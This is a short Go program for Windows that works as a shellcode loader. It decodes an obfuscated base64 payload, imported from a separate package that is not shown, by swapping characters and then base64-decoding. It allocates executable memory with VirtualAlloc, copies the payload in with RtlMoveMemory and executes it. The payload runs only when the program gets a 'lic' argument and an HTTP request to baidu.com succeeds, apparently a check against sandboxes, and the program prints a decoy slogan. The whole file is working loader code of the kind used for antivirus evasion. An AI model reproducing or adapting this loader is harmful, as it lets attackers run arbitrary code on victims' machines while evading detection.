package main

import (
	"./base64_Sell"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"syscall"
	"unsafe"
	"os"
)
var (
	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func build(ddm string){
	str1 :=strings.Replace(ddm, "#", "A", -1 )
	str2 :=strings.Replace(str1, "!", "H", -1 )
	str3 :=strings.Replace(str2, "@", "1", -1 )
	str4 :=strings.Replace(str3, ")", "T", -1 )
	sDec,_ := base64.StdEncoding.DecodeString(str4)
	fmt.Printf("%x",sDec)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	syscall.Syscall(addr, 0, 0, 0, 0)

}
func main() {
	fmt.Println("富强、民主、文明、和谐，自由、平等、公正、法治")
	if os.Args[1]!="lic" {
		fmt.Println("富强、民主、文明、和谐，自由、平等、公正、法治")
	}else {
		u, _ := url.Parse("https://baidu.com")
		q := u.Query()
		u.RawQuery = q.Encode()
		res, err := http.Get(u.String())
		if err != nil {
			return
		}
		resCode := res.StatusCode
		res.Body.Close()
		if err != nil {
			return
		}

		var y int = 200
		println(resCode)
		if resCode == y {
			build(base64_Sell.Sell)
		}

	}

}
